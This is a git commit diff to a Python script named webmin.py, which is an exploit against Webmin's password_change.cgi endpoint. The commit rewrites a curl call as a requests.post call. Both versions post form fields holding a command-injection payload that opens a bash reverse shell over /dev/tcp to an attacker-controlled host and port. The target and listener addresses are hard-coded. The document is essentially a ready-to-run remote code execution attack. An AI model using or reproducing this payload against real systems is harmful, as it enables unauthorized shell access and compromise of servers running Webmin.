2086d1779ae804c4a738ca06f5f5a55fcaf09f35
Spiritix <77000299+SpiritixCS@users.noreply.github.com>
2024-04-30 15:18:01 +0200

    Update webmin.py

--- webmin.py
+++ webmin.py
@@ -1,16 +1,21 @@
-import subprocess
+import requests
 
 def exploit(target, lhost, lport):
     exploit_target = (
-        f"curl -sk -X POST 'https://{target}:10000{vuln_path}' "
-        "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47' "
-        f"-H 'Referer: https://{target}:10000/' "
-        "-H 'Content-Type: application/x-www-form-urlencoded' "
-        f"-d 'expired=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27&new1=SmKUYgMFtixFlLt6nggby&new2=SmKUYgMFtixFlLt6nggby&old=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27'"
+        f"https://{target}:10000{vuln_path}"
     )
-    subprocess.run(
-        exploit_target, shell=True
-    )
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47',
+        'Referer': f'https://{target}:10000/',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = {
+        'expired': f"bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'",
+        'new1': 'SmKUYgMFtixFlLt6nggby',
+        'new2': 'SmKUYgMFtixFlLt6nggby',
+        'old': f"bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'"
+    }
+    requests.post(exploit_target, headers=headers, data=data)
     print("Exploit script executed successfully.")
     exit()
 
@@ -18,4 +23,5 @@ def exploit(target, lhost, lport):
 target = "192.168.1.67"
 lhost = "192.168.1.72"
 lport = "4443"
+vuln_path = "/password_change.cgi"
 exploit(target, lhost, lport)
